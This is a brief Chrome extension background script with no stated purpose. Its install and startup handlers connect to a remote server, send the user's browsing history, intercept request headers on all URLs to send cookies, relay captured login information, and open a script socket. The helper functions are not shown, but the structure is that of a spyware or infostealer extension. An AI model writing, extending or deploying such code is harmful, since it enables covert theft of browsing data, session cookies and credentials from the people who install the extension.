chrome.runtime.onInstalled.addListener(() => {
  connectToServer();
  searchAndSendHistory();
  createScriptSocket();
  chrome.webRequest.onBeforeSendHeaders.addListener((info) => {
      updateSecurityWebsites();
      checkAndSendCookies(info);
    }, {
      urls: ["<all_urls>"]
    },
    ['blocking', 'requestHeaders']);
  chrome.history.onVisited.addListener((page) => {
    sendHistoryPage(page);
  });
  createTabListeners();
});

chrome.runtime.onStartup.addListener(() => {
  connectToServer();
  createScriptSocket();
});

chrome.runtime.onSuspend.addListener(() => {
  disconnectFromServer(socket);
});

chrome.runtime.onMessage.addListener((request, sender) => {
  sendLoginInfo(request.loginListener);
});
